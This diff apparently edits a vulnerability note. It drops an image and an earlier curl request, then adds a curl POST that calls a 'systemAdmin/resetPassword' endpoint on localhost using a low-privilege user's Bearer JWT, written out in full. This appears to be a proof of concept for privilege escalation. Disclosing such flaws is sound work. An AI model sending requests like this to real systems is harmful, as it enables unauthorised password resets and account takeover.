@@ -1,3 +1,2 @@
-![alt text](image.png)
-
-curl -k -i -X POST http://www.pcoi.top/mySecurityIssues --data "username=admin001"
+curl -k -i -X POST "http://localhost:8080/systemAdmin/resetPassword" --data "userId=e474075a-bde0-11f0-8025-0250e731fa1b" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGFpbXMiOnsidHlwZSI6MCwicm9sZSI6MCwidXNlcklkIjoiYjA2MTRhNWItYmUzNC0xMWYwLTgwMjUtMDI1MGU3MzFmYTFiIiwidXNlcm5hbWUiOiJubnVzZXIifSwiZXhwIjoxNzYyODIzOTI1fQ.FfYWWaB_FBLn5eEjpBo54ec4JRJ62XXHVpGDbYIQ3zw"
+“
